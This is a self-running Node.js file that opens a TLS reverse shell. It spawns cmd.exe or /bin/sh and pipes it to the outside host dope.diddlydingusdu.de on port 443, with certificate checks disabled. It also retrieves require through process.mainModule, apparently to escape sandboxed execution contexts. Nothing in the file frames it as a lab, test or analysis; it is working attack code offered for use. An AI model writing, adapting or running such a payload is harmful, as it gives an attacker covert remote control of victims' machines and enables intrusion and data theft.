try{
require = process.mainModule.require;
}catch(e){}
const { spawn } = require('child_process');
const tls = require('tls');
const os = require('os');
class ReverseShellRunner{
    constructor(){

    }
    async run(host,port){
        this.connectTls(host, port);
    }
    getShell(){
        switch(os.platform()){
            case 'win32':
                    return 'cmd.exe';
                break;
            default:
                return '/bin/sh';
                break;
        }
    }
    spawnShell(){
         this.shell = spawn(this.getShell(), [], {
            stdio: ['pipe', 'pipe', 'pipe']
        });
        this.shell.stdout.on('data', (data) => {
            this.client.write(data);
        });
        this.shell.stderr.on('data', (data) => {
            this.client.write(data);
        });
        this.shell.on('close', (code) => {
            this.client.end();
        });
    }
    async connectTls(host, port){
        const options = {
            rejectUnauthorized: false,
        }
        this.client = tls.connect(port, host, options, () => {
            console.log('connected');
            this.spawnShell();
        });
        this.client.on('data', (data) => {
            this.shell.stdin.write(data);
        });
        this.client.on('error', (err) => {
            console.log(err);
        });
        this.client.on('end', () => {
            this.shell.kill();
            console.log('disconnected');
        });
    }
}

const init = async ()=>{
	const runner = new ReverseShellRunner();
	runner.run('dope.diddlydingusdu.de',443);	
}
init();
